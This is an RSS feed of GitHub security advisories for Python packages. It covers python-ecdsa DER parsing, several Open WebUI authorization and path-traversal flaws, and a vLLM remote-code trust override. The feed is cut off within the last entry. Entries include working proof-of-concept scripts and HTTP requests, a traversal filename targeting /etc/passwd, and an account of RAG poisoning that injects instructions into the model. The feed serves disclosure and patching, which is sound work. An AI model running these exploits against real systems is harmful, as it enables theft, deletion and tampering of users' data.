<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/pip.rss</id>
    <title>Security Advisory for Python packages hosted at PyPI.org</title>
    <updated>2026-03-27T16:14:34.797Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"/>
    <subtitle>Security Advisory for Python packages hosted at PyPI.org on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[ecdsa] python-ecdsa: Denial of Service via improper DER length validation in crafted private keys]]></title>
        <id>https://github.com/advisories/GHSA-9f5j-8jwj-x28g</id>
        <link href="https://github.com/advisories/GHSA-9f5j-8jwj-x28g"/>
        <updated>2026-03-27T15:56:04.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>An issue in the low-level DER parsing functions can cause unexpected exceptions to be raised from the public API functions.</p>
<ol>
<li><p><code>ecdsa.der.remove_octet_string()</code> accepts truncated DER where the encoded length exceeds the available buffer. For example, an OCTET STRING that declares a length of 4096 bytes but provides only 3 bytes is parsed successfully instead of being rejected.</p>
</li>
<li><p>Because of that, a crafted DER input can cause <code>SigningKey.from_der()</code> to raise an internal exception (<code>IndexError: index out of bounds on dimension 1</code>) rather than cleanly rejecting malformed DER (e.g., raising <code>UnexpectedDER</code> or <code>ValueError</code>). Applications that parse untrusted DER private keys may crash if they do not handle unexpected exceptions, resulting in a denial of service.</p>
</li>
</ol>
<h2 id="impact">Impact</h2>
<p>Potential denial-of-service when parsing untrusted DER private keys due to unexpected internal exceptions, and malformed DER acceptance due to missing bounds checks in DER helper functions.</p>
<h2 id="reproduction">Reproduction</h2>
<p>Attach and run the following PoCs:</p>
<h3 id="poc_truncated_der_octetpy">poc_truncated_der_octet.py</h3>
<pre><code class="language-python">from ecdsa.der import remove_octet_string, UnexpectedDER

# OCTET STRING (0x04)
# Declared length: 0x82 0x10 0x00  -&gt; 4096 bytes
# Actual body: only 3 bytes -&gt; truncated DER
bad = b"\x04\x82\x10\x00" + b"ABC"

try:
    body, rest = remove_octet_string(bad)
    print("[BUG] remove_octet_string accepted truncated DER.")
    print("Declared length=4096, actual body_len=", len(body), "rest_len=", len(rest))
    print("Body=", body)
    print("Rest=", rest)
except UnexpectedDER as e:
    print("[OK] Rejected malformed DER:", e)
</code></pre>
<ul>
<li>Expected: reject malformed DER when declared length exceeds available bytes</li>
<li>Actual: accepts the truncated DER and returns a shorter body</li>
<li>Example output:</li>
</ul>
<pre><code>Parsed body_len= 3 rest_len= 0 (while declared length is 4096)
</code></pre>
<h3 id="poc_signingkey_from_der_indexerrorpy">poc_signingkey_from_der_indexerror.py</h3>
<pre><code class="language-python">from ecdsa import SigningKey, NIST256p
import ecdsa

print("ecdsa version:", ecdsa.__version__)

sk = SigningKey.generate(curve=NIST256p)
good = sk.to_der()
print("Good DER len:", len(good))


def find_crashing_mutation(data: bytes):
    b = bytearray(data)

    # Try every OCTET STRING tag position and corrupt a short-form length byte
    for i in range(len(b) - 4):
        if b[i] != 0x04:  # OCTET STRING tag
            continue

        L = b[i + 1]
        if L &gt;= 0x80:
            # skip long-form lengths for simplicity
            continue

        max_possible = len(b) - (i + 2)
        if max_possible &lt;= 10:
            continue

        # Claim more bytes than exist -&gt; truncation
        newL = min(0x7F, max_possible + 20)
        b2 = bytearray(b)
        b2[i + 1] = newL

        try:
            SigningKey.from_der(bytes(b2))
        except Exception as e:
            return i, type(e).__name__, str(e)

    return None


res = find_crashing_mutation(good)
if res is None:
    print("[INFO] No exception triggered by this mutation strategy.")
else:
    i, etype, msg = res
    print("[BUG] SigningKey.from_der raised unexpected exception type.")
    print("Offset:", i, "Exception:", etype, "Message:", msg)
</code></pre>
<ul>
<li>Expected: reject malformed DER with <code>UnexpectedDER</code> or <code>ValueError</code></li>
<li>Actual: deterministically triggers an internal <code>IndexError</code> (DoS risk)</li>
<li>Example output:</li>
</ul>
<pre><code>Result: (5, 'IndexError', 'index out of bounds on dimension 1')
</code></pre>
<h2 id="suggested-fix">Suggested fix</h2>
<p>Add “declared length must fit buffer” checks in DER helper functions similarly to the existing check in <code>remove_sequence()</code>:</p>
<ul>
<li><code>remove_octet_string()</code></li>
<li><code>remove_constructed()</code></li>
<li><code>remove_implicit()</code></li>
</ul>
<p>Additionally, consider catching unexpected internal exceptions in DER key parsing paths and re-raising them as <code>UnexpectedDER</code> to avoid crashy failure modes.</p>
<h2 id="credit">Credit</h2>
<p>Mohamed Abdelaal (@0xmrma)</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/tlsfuzzer/python-ecdsa/security/advisories/GHSA-9f5j-8jwj-x28g">https://github.com/tlsfuzzer/python-ecdsa/security/advisories/GHSA-9f5j-8jwj-x28g</a></li>
<li><a href="https://github.com/tlsfuzzer/python-ecdsa/commit/bd66899550d7185939bf27b75713a2ac9325a9d3">https://github.com/tlsfuzzer/python-ecdsa/commit/bd66899550d7185939bf27b75713a2ac9325a9d3</a></li>
<li><a href="https://github.com/tlsfuzzer/python-ecdsa/releases/tag/python-ecdsa-0.19.2">https://github.com/tlsfuzzer/python-ecdsa/releases/tag/python-ecdsa-0.19.2</a></li>
<li><a href="https://github.com/advisories/GHSA-9f5j-8jwj-x28g">https://github.com/advisories/GHSA-9f5j-8jwj-x28g</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9f5j-8jwj-x28g</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-03-27T15:56:01.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[open-webui] Open WebUI's Insecure Direct Object Reference (IDOR) allows access to other users' memories]]></title>
        <id>https://github.com/advisories/GHSA-w9f8-gxf9-rhvw</id>
        <link href="https://github.com/advisories/GHSA-w9f8-gxf9-rhvw"/>
        <updated>2026-03-27T15:35:54.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Any authenticated user can read other users' private memories via <code>/api/v1/retrieval/query/collection</code></p>
<h3 id="details">Details</h3>
<p><strong>Vulnerability 1: Missing authorization in collection querying</strong></p>
<p>In <code>backend/open_webui/routers/retrieval.py</code>, the <code>query_collection_handler</code> function accepts a list of <code>collection_names</code> but performs no ownership validation:</p>
<pre><code class="language-python">async def query_collection_handler(
    request: Request,
    form_data: QueryCollectionsForm,
    user=Depends(get_verified_user),  # Only checks authentication, not authorization
):
</code></pre>
<p>Collection names follow predictable patterns:</p>
<ul>
<li>User files: <code>file-{FILE_UUID}</code></li>
<li>User memories: <code>user-memory-{USER_UUID}</code> (requires Memory experimental feature)</li>
</ul>
<h3 id="poc">PoC</h3>
<p><strong>Environment:</strong> Open WebUI v0.8.3, default configuration.
<strong>Setup:</strong></p>
<ol>
<li>Register two users: admin (first user) and attacker (second user).</li>
<li>As admin, upload a PDF document through chat.</li>
<li>As admin, enable Memory (Settings → Personalization → Memory) and add some memories.</li>
</ol>
<p><strong>Exploitation — Step 1: Enumerate all users</strong></p>
<pre><code>GET /api/v1/users/search HTTP/1.1
Host: &lt;target&gt;
Authorization: Bearer &lt;attacker_token&gt;
</code></pre>
<p>Response reveals all users including admin's UUID, email, and role:</p>
<pre><code class="language-json">{
  "users": [
    {
      "id": "1e4756eb-b064-4781-8b06-4979bca59c8b",
      "name": "user",
      "email": "user@test.com",
      "role": "user"
    },
    {
      "id": "81d2f94a-3dfb-479c-af98-e29f0f40c4ba",
      "name": "admin",
      "email": "admin@test.com",
      "role": "admin"
    }
  ]
}
</code></pre>
<img width="1340" height="731" alt="1poc - users" src="https://github.com/user-attachments/assets/46d1cb64-2f84-480e-b887-819008ddabc9">

<p><strong>Exploitation — Step 2: Read admin's memories</strong></p>
<p>Using the admin UUID obtained in Step 1, query their private memory collection:</p>
<pre><code>POST /api/v1/retrieval/query/collection HTTP/1.1
Host: &lt;target&gt;
Authorization: Bearer &lt;attacker_token&gt;
Content-Type: application/json

{
  "collection_names": ["user-memory-&lt;admin_UUID_from_step_1&gt;"],
  "query": "test"
}
</code></pre>
<p>Response returns admin's private memories:</p>
<pre><code class="language-json">{
  "documents": [["User is testing IDOR", "User - Mariusz, security researcher"]]
}
</code></pre>
<img width="1285" height="606" alt="2poc - memory" src="https://github.com/user-attachments/assets/eac7c129-dcad-4afd-9449-2ca93b19e082">

<p><strong>Note:</strong> Step 2 requires the Memory experimental feature to be enabled. Steps 1 and 3 work on default configuration.</p>
<p><strong>Exploitation — Step 3: Read admin's private file (Vulnerability 1)</strong></p>
<p>File collections use the pattern <code>file-{FILE_UUID}</code>. The file UUID must be obtained separately. Once known:</p>
<pre><code>POST /api/v1/retrieval/query/collection HTTP/1.1
Host: &lt;target&gt;
Authorization: Bearer &lt;attacker_token&gt;
Content-Type: application/json

{
  "collection_names": ["file-&lt;file_UUID&gt;"],
  "query": "test"
}
</code></pre>
<p>Response returns admin's private document content and full metadata:</p>
<pre><code class="language-json">{
  "documents": [["Test PDF  \nabc   \nbcd"]],
  "metadatas": [[{
    "name": "Test PDF.pdf",
    "author": "Mariusz Maik",
    "created_by": "81d2f94a-3dfb-479c-af98-e29f0f40c4ba",
    "file_id": "243bee10-49ad-466f-884b-67b6b3d74968"
  }]]
}
</code></pre>
<img width="1413" height="908" alt="image" src="https://github.com/user-attachments/assets/43041261-ec98-4f3f-8c26-a0c63ef18596">

<h3 id="impact">Impact</h3>
<ul>
<li><strong>Document theft:</strong> Any authenticated user can read the full content and metadata of files uploaded by any other user, including admins.</li>
<li><strong>User enumeration:</strong> All user UUIDs, emails, names, and roles are exposed to any authenticated user via <code>/api/v1/users/search</code>.</li>
<li><strong>Memory leakage:</strong> When the Memory experimental feature is enabled, personal memories stored by users for LLM personalization can be read by any other user — directly contradicting the official documentation.</li>
<li><strong>No admin privileges required:</strong> A regular user account is sufficient to exploit all of the above.</li>
</ul>
<h3 id="suggested-fix">Suggested Fix</h3>
<p><strong>1. Add ownership validation in <code>/api/v1/retrieval/query/collection</code>:</strong></p>
<pre><code class="language-python">async def query_collection_handler(
    request: Request,
    form_data: QueryCollectionsForm,
    user=Depends(get_verified_user),
):
    for collection_name in form_data.collection_names:
        if collection_name.startswith("user-memory-"):
            owner_id = collection_name.replace("user-memory-", "")
            if owner_id != user.id and user.role != "admin":
                raise HTTPException(status_code=403, detail="Access denied")
        elif collection_name.startswith("file-"):
            file_id = collection_name.replace("file-", "")
            # user_has_access_to_file — placeholder; verify file ownership
            # e.g. check if created_by matches user.id
            if not user_has_access_to_file(user.id, file_id):
                raise HTTPException(status_code=403, detail="Access denied")
</code></pre>
<p><strong>2. Restrict <code>/api/v1/users/search</code></strong> to admin-only or limit the fields returned to non-privileged users.</p>
<h3 id="disclosure">Disclosure</h3>
<p>AI was used to assist with writing this report. The vulnerability was identified and confirmed through hands-on testing on Open WebUI v0.8.3. All screenshots are from real testing.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/open-webui/open-webui/security/advisories/GHSA-w9f8-gxf9-rhvw">https://github.com/open-webui/open-webui/security/advisories/GHSA-w9f8-gxf9-rhvw</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-29071">https://nvd.nist.gov/vuln/detail/CVE-2026-29071</a></li>
<li><a href="https://github.com/advisories/GHSA-w9f8-gxf9-rhvw">https://github.com/advisories/GHSA-w9f8-gxf9-rhvw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-w9f8-gxf9-rhvw</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2026-03-27T15:35:49.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[open-webui] Open WebUI has unauthorized deletion of knowledge files]]></title>
        <id>https://github.com/advisories/GHSA-26gm-93rw-cchf</id>
        <link href="https://github.com/advisories/GHSA-26gm-93rw-cchf"/>
        <updated>2026-03-27T15:35:23.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>An access control check is missing when deleting a file from a knowledge base. The only check being done is that the user has write access to the knowledge base (or is admin), but NOT that the file actually belongs to this knowledge base. It is thus possible to delete arbitrary files from arbitrary knowledge bases (as long as one knows the file id)</p>
<h3 id="details">Details</h3>
<p>The source code at <a href="https://github.com/open-webui/open-webui/blob/main/backend/open_webui/routers/knowledge.py#L803">https://github.com/open-webui/open-webui/blob/main/backend/open_webui/routers/knowledge.py#L803</a> does not properly validate that the file being deleted belongs to the current knowledge base:</p>
<pre><code>@router.post("/{id}/file/remove", response_model=Optional[KnowledgeFilesResponse])
def remove_file_from_knowledge_by_id(
    id: str,
    form_data: KnowledgeFileIdForm,
    delete_file: bool = Query(True),
    user=Depends(get_verified_user),
    db: Session = Depends(get_session),
):
    knowledge = Knowledges.get_knowledge_by_id(id=id, db=db)
    [...]
    # Note  : Access control check on the knowledge base
    if (
        knowledge.user_id != user.id
        and not AccessGrants.has_access(
            user_id=user.id,
            resource_type="knowledge",
            resource_id=knowledge.id,
            permission="write",
            db=db,
        )
        and user.role != "admin"
    ):
        raise HTTPException(
            status_code=status.HTTP_400_BAD_REQUEST,
            detail=ERROR_MESSAGES.ACCESS_PROHIBITED,
        )

    file = Files.get_file_by_id(form_data.file_id, db=db)
    [...]
    # Note : No checks on the file

    if delete_file:
        try:
            # Remove the file's collection from vector database
            file_collection = f"file-{form_data.file_id}"
            if VECTOR_DB_CLIENT.has_collection(collection_name=file_collection):
                VECTOR_DB_CLIENT.delete_collection(collection_name=file_collection)
        except Exception as e:
            log.debug("This was most likely caused by bypassing embedding processing")
            log.debug(e)
            pass

        # Delete file from database
        Files.delete_file_by_id(form_data.file_id, db=db)
[...]
</code></pre>
<h3 id="poc">PoC</h3>
<p>Victim has a knowledge base with a file (id: 9db6dcee-bb3b-483e-aaf3-310fda366af1)
Attacker creates their own collection (id: dde9e2b6-21c9-4aa1-a1cf-8cb0e4392f2b)
Attacker deletes the victim file from their own collection:</p>
<pre><code>POST /api/v1/knowledge/dde9e2b6-21c9-4aa1-a1cf-8cb0e4392f2b/file/remove HTTP/1.1
Host: gaius-neo-val.fr.space.corp
Authorization: Bearer eyJhbGciOiJIUzI1[...]nHiaod-3vfNE0
[...]

{"file_id":"9db6dcee-bb3b-483e-aaf3-310fda366af1"}

-----

HTTP/1.1 200 OK
[...]
</code></pre>
<p>The file is then deleted from the victim's knowledge base.</p>
<h3 id="impact">Impact</h3>
<p>Arbitrary file deletion</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/open-webui/open-webui/security/advisories/GHSA-26gm-93rw-cchf">https://github.com/open-webui/open-webui/security/advisories/GHSA-26gm-93rw-cchf</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-29070">https://nvd.nist.gov/vuln/detail/CVE-2026-29070</a></li>
<li><a href="https://github.com/open-webui/open-webui/blob/main/backend/open_webui/routers/knowledge.py#L803">https://github.com/open-webui/open-webui/blob/main/backend/open_webui/routers/knowledge.py#L803</a></li>
<li><a href="https://github.com/advisories/GHSA-26gm-93rw-cchf">https://github.com/advisories/GHSA-26gm-93rw-cchf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-26gm-93rw-cchf</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-03-27T15:35:19.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[open-webui] Open WebUI's process_files_batch() endpoint missing ownership check, allows unauthorized file overwrite]]></title>
        <id>https://github.com/advisories/GHSA-jjp7-g2jw-wh3j</id>
        <link href="https://github.com/advisories/GHSA-jjp7-g2jw-wh3j"/>
        <updated>2026-03-27T15:34:28.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Any authenticated user can overwrite any file's content by ID through the <code>POST /api/v1/retrieval/process/files/batch</code> endpoint. The endpoint performs no ownership check, so a regular user with read access to a shared knowledge base can obtain file UUIDs via <code>GET /api/v1/knowledge/{id}/files</code> and then overwrite those files, escalating from read to write. The overwritten content is served to the LLM via RAG, meaning the attacker controls what the model tells other users.</p>
<h3 id="details">Details</h3>
<p>The <code>process_files_batch()</code> function in <code>backend/open_webui/routers/retrieval.py</code> appears to be designed as an internal helper. The knowledge base router (<code>add_files_to_knowledge_batch()</code> in <code>knowledge.py</code>) imports and calls it directly after performing its own ownership and access control checks. The frontend never calls the retrieval route directly; all legitimate UI flows go through the knowledge base wrapper.</p>
<p>However, the function is also exposed as a standalone HTTP endpoint via <code>@router.post(...)</code>. This direct route only requires <code>get_verified_user</code> (any authenticated user) and performs no ownership check of its own:</p>
<pre><code class="language-python">for file in form_data.files:
    text_content = file.data.get("content", "")  # attacker-controlled

    file_updates.append(FileUpdateForm(
        hash=calculate_sha256_string(text_content),
        data={"content": text_content},            # written to DB
    ))

for file_update, file_result in zip(file_updates, file_results):
    Files.update_file_by_id(id=file_result.file_id, form_data=file_update)
    #                       ^^^ no ownership check
</code></pre>
<p>There is no verification that <code>file.user_id == user.id</code> before the write. Any authenticated user who knows a file UUID can overwrite that file.</p>
<p><strong>How an attacker obtains file UUIDs:</strong></p>
<p>Same as with read access, any user who can see a knowledge base can retrieve file IDs for every document in it via <code>GET /api/v1/knowledge/{id}/files</code>. In deployments where knowledge bases are shared across teams, this gives any regular user a list of valid targets.</p>
<p><strong>Suggested fix:</strong> Add an ownership check before writing:</p>
<pre><code class="language-python">for file in form_data.files:
    db_file = Files.get_file_by_id(file.id)
    if not db_file or (db_file.user_id != user.id and user.role != "admin"):
        file_errors.append(BatchProcessFilesResult(
            file_id=file.id, status="failed",
            error="Permission denied: not file owner",
        ))
        continue
</code></pre>
<p><strong>Classification:</strong></p>
<ul>
<li>CWE-639: Authorization Bypass Through User-Controlled Key</li>
<li>OWASP API1:2023: Broken Object Level Authorization</li>
</ul>
<p>Tested on Open WebUI <strong>0.8.3</strong> using a default Docker configuration.</p>
<h3 id="poc">PoC</h3>
<p><strong>Prerequisites:</strong></p>
<ul>
<li>Default Open WebUI installation (Docker: <code>ghcr.io/open-webui/open-webui:main</code>)</li>
<li>An admin or user creates a knowledge base with shared read access and uploads a file</li>
<li>A regular user account exists (the attacker)</li>
</ul>
<p><strong>Obtaining the file UUID (attacker):</strong></p>
<pre><code>GET /api/v1/knowledge/{kb_id}/files
</code></pre>
<p>This returns metadata for all files in the KB, including their UUIDs.</p>
<p><strong>Exploit (attacker):</strong></p>
<pre><code class="language-bash">python3 poc_exploit.py --url http://&lt;host&gt;:3000 --file-id &lt;target-file-uuid&gt; -t &lt;attacker-jwt&gt;
</code></pre>
<p>The PoC script: <a href="https://github.com/user-attachments/files/25470374/poc_exploit.py">poc_exploit.py</a></p>
<ol>
<li>Authenticates as the attacker</li>
<li>Overwrites the target file via <code>POST /api/v1/retrieval/process/files/batch</code> with a canary payload containing a unique marker string</li>
<li>Reads the file back and confirms the attacker's content replaced the original</li>
</ol>
<p><strong>Verifying RAG poisoning:</strong></p>
<p>After the overwrite, log in as any other user, start a chat with the poisoned knowledge base attached, and ask about the document. The model's response will include the attacker's canary string (<code>BOLA-&lt;marker&gt;</code>), confirming that attacker-controlled content reached the LLM and influenced the response.</p>
<p>No special tooling is required. The script uses only Python 3 standard library (<code>urllib</code>).</p>
<h3 id="impact">Impact</h3>
<p><strong>Who is affected:</strong> Any multi-user Open WebUI deployment where knowledge bases are shared. The attacker needs a valid account (any role) and a target file UUID, which is available through any knowledge base they have read access to.</p>
<p><strong>What can happen:</strong></p>
<ul>
<li><strong>RAG poisoning:</strong> The overwritten content is served to the LLM via RAG. The attacker controls what the model tells every user who queries that knowledge base. This includes the ability to inject instructions the model will follow, which could lead to further exploitation depending on what tools and capabilities are available in the deployment (e.g. code interpreter, function calling).</li>
<li><strong>Silent data corruption:</strong> The original file content is permanently replaced with no indication to the file owner or other users that it has changed.</li>
<li><strong>No audit trail:</strong> Nothing records that an unauthorized user modified the file.</li>
</ul>
<p>The core issue is that a function designed as an internal helper is exposed as a public endpoint without its own authorization checks. A user with read-only access to a knowledge base can escalate to write access over any file in it.</p>
<h3 id="disclaimer-on-the-use-of-ai-powered-tools">Disclaimer on the use of AI powered tools</h3>
<p>The research and reporting related to this vulnerability was aided by the help of AI tools.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/open-webui/open-webui/security/advisories/GHSA-jjp7-g2jw-wh3j">https://github.com/open-webui/open-webui/security/advisories/GHSA-jjp7-g2jw-wh3j</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-28788">https://nvd.nist.gov/vuln/detail/CVE-2026-28788</a></li>
<li><a href="https://github.com/open-webui/open-webui/releases/tag/v0.8.6">https://github.com/open-webui/open-webui/releases/tag/v0.8.6</a></li>
<li><a href="https://github.com/advisories/GHSA-jjp7-g2jw-wh3j">https://github.com/advisories/GHSA-jjp7-g2jw-wh3j</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jjp7-g2jw-wh3j</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-03-27T15:34:26.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[open-webui] Open WebUI vulnerable to Path Traversal in `POST /api/v1/audio/transcriptions`]]></title>
        <id>https://github.com/advisories/GHSA-vvxm-vxmr-624h</id>
        <link href="https://github.com/advisories/GHSA-vvxm-vxmr-624h"/>
        <updated>2026-03-27T15:29:35.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>An unsanitised filename field in the speech-to-text transcription endpoint allows any authenticated non-admin user to trigger a <code>FileNotFoundError</code> whose message — including the server's absolute <code>DATA_DIR</code> path — is returned verbatim in the HTTP 400 response body, confirming information disclosure on all default deployments.</p>
<h3 id="details">Details</h3>
<p><code>backend/open_webui/routers/audio.py:1197</code> extracts a file extension from the raw multipart <code>filename</code> using <code>file.filename.split(".")[-1]</code> with no path sanitisation. The result is concatenated into a filesystem path and passed to <code>open()</code>:</p>
<pre><code class="language-python">ext       = file.filename.split(".")[-1]       # attacker-controlled, no sanitisation
filename  = f"{id}.{ext}"                      # may contain "/"
file_path = f"{file_dir}/{filename}"
with open(file_path, "wb") as f:
    f.write(contents)
</code></pre>
<p>If the filename is <code>audio./etc/passwd</code>, <code>split(".")[-1]</code> yields <code>/etc/passwd</code> and the assembled path becomes:</p>
<pre><code>{CACHE_DIR}/audio/transcriptions/{uuid}./etc/passwd
</code></pre>
<p><code>open()</code> fails with <code>FileNotFoundError</code>. The outer <code>except</code> block at line 1231 returns the exception via <code>ERROR_MESSAGES.DEFAULT(e)</code>, leaking the full absolute path in the response body.</p>
<p>The MIME-type guard at line 1190 checks <code>Content-Type</code> (a separate multipart field) and does not constrain <code>filename</code>. Setting <code>Content-Type: audio/wav</code> satisfies the guard regardless of the filename value.</p>
<p>This handler is the only file upload path in the codebase that omits <code>os.path.basename()</code>. Both sibling handlers apply it explicitly:</p>
<pre><code class="language-python"># files.py:244
filename = os.path.basename(file.filename)

# pipelines.py:206
filename = os.path.basename(file.filename)
</code></pre>
<p><strong>Recommended fix</strong> — match the existing pattern and suppress path leakage in errors:</p>
<pre><code class="language-python"># audio.py:1197 — sanitise extension
from pathlib import Path
safe_name = Path(file.filename).name
ext = Path(safe_name).suffix.lstrip(".") or "bin"

# audio.py:1231 — suppress internal path in error response
except Exception as e:
    log.exception(e)
    raise HTTPException(status_code=400, detail="Transcription failed.")
</code></pre>
<hr>
<h3 id="poc">PoC</h3>
<p><strong>Requirements:</strong> a running Open WebUI instance and one standard (non-admin) user account.</p>
<pre><code class="language-bash">docker run -d -p 3000:8080 --name owui-test ghcr.io/open-webui/open-webui:latest
# wait ~30 s, register a standard user at http://localhost:3000
pip install requests
</code></pre>
<pre><code class="language-python">import requests, sys

BASE_URL = "http://localhost:3000"
EMAIL    = "user@example.com"
PASSWORD = "changeme"

token = requests.post(f"{BASE_URL}/api/v1/auths/signin",
                      json={"email": EMAIL, "password": PASSWORD},
                      timeout=10).json()["token"]

boundary = "----Boundary"
wav_stub = b"RIFF\x00\x00\x00\x00WAVE"
body = (
    f'--{boundary}\r\nContent-Disposition: form-data; name="file"; '
    f'filename="audio./etc/passwd"\r\nContent-Type: audio/wav\r\n\r\n'
).encode() + wav_stub + f"\r\n--{boundary}--\r\n".encode()

resp = requests.post(
    f"{BASE_URL}/api/v1/audio/transcriptions",
    data=body,
    headers={"Authorization": f"Bearer {token}",
             "Content-Type": f"multipart/form-data; boundary={boundary}"},
    timeout=15,
)
print(resp.status_code, resp.text)
</code></pre>
<p><strong>Observed output (live test, commit <code>b8112d72b</code>):</strong></p>
<pre><code>400 {"detail":"[ERROR: [Errno 2] No such file or directory:
'/app/backend/data/cache/audio/transcriptions/59457ccf-…./etc/passwd']"}
</code></pre>
<p>The absolute <code>DATA_DIR</code> path is confirmed. Filesystem structure can be enumerated by varying traversal depth and observing which error messages change.</p>
<p><strong>Note on the write primitive:</strong> the traversal path includes a fresh UUID segment (<code>{uuid}.</code>) that never pre-exists as a directory, so <code>open()</code> is OS-blocked in all practical scenarios. The impact is information disclosure only.</p>
<hr>
<h3 id="impact">Impact</h3>
<p>Any authenticated, non-admin user on a default Open WebUI deployment can leak the server's absolute <code>DATA_DIR</code> filesystem path. The route is gated by <code>get_verified_user</code> — the lowest privilege tier — so every registered account is a potential attacker. Multi-tenant and shared deployments are most exposed.</p>
<blockquote>
<p><strong>AI Disclosure:</strong> Claude was used to draft this report and the PoC. The vulnerability was identified via manual static analysis of commit <code>b8112d72b</code>. All code references were verified by the reporter, who accepts full responsibility for accuracy.</p>
</blockquote>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/open-webui/open-webui/security/advisories/GHSA-vvxm-vxmr-624h">https://github.com/open-webui/open-webui/security/advisories/GHSA-vvxm-vxmr-624h</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-28786">https://nvd.nist.gov/vuln/detail/CVE-2026-28786</a></li>
<li><a href="https://github.com/open-webui/open-webui/commit/387225eb8b3906909436004f84fff1b012e067d4">https://github.com/open-webui/open-webui/commit/387225eb8b3906909436004f84fff1b012e067d4</a></li>
<li><a href="https://github.com/advisories/GHSA-vvxm-vxmr-624h">https://github.com/advisories/GHSA-vvxm-vxmr-624h</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vvxm-vxmr-624h</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-03-27T15:29:32.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[vllm] vLLM has Hardcoded Trust Override in Model Files Enables RCE Despite Explicit User Opt-Out]]></title>
        <id>https://github.com/advisories/GHSA-7972-pg2x-xr59</id>
        <link href="https://github.com/advisories/GHSA-7972-pg2x-xr59"/>
        <updated>2026-03-27T15:27:20.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>  Two model implementation files hardcode <code>trust_remote_code=True</code> when loading sub-components, bypassing the user's explicit <code>--trust-remote-code=False</code> security opt-out. This enables remote code execution via malicious model
  repositories even when the user has explicitly disabled remote code trust.</p>
<h3 id="details">Details</h3>
<p>  <strong>Affected files (latest main branch):</strong></p>
<ol>
<li><code>vllm/model_executor/models/nemotron_vl.py:430</code></li>
</ol>
<pre><code class="language-python">vision_model = AutoModel.from_config(config.vision_config, trust_remote_code=True)
</code></pre>
<ol start="2">
<li>vllm/model_executor/models/kimi_k25.py:177</li>
</ol>
<pre><code class="language-python">  cached_get_image_processor(self.ctx.model_config.model, trust_remote_code=True)
</code></pre>
<p>  Both pass a hardcoded trust_remote_code=True to HuggingFace API calls, overriding the user's global --trust-remote-code=False setting.</p>
<p>  Relation to prior CVEs:</p>
<ul>
<li>CVE-2025-66448 fixed auto_map resolution in vllm/transformers_utils/config.py (config loading path)</li>
<li>CVE-2026-22807 fixed broader auto_map at startup</li>
<li>Both fixes are present in the current code. These hardcoded instances in model files survived both patches — different code paths.</li>
</ul>
<h3 id="impact">Impact</h3>
<p>  Remote code execution. An attacker can craft a malicious model repository that executes arbitrary Python code when loaded by vLLM, even when the user has explicitly set --trust-remote-code=False. This undermines the security guarantee
  that trust_remote_code=False is intended to provide.</p>
<p>  Remediation: Replace hardcoded trust_remote_code=True with self.config.model_config.trust_remote_code in both files. Raise a clear error if the model component requires remote code but the user hasn't opted in.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/vllm-project/vllm/security/advisories/GHSA-7972-pg2x-xr59">https://github.com/vllm-project/vllm/security/advisories/GHSA-7972-pg2x-xr59</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-27893">https://nvd.nist.gov/vuln/detail/CVE-2026-27893</a></li>
<li><a href="https://github.com/vllm-project/vllm/pull/36192">https://github.com/vllm-project/vllm/pull/36192</a></li>
<li><a href="https://github.com/vllm-project/vllm/commit/00bd08edeee5dd4d4c13277c0114a464011acf72">https://github.com/vllm-project/vllm/commit/00bd08edeee5dd4d4c13277c0114a464011acf72</a></li>
<li><a href="https://github.com/advisories/GHSA-7972-pg2x-xr59">https://github.com/advisories/GHSA-7972-pg2x-xr59</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7972-pg2x-xr59</uri>
        </author>
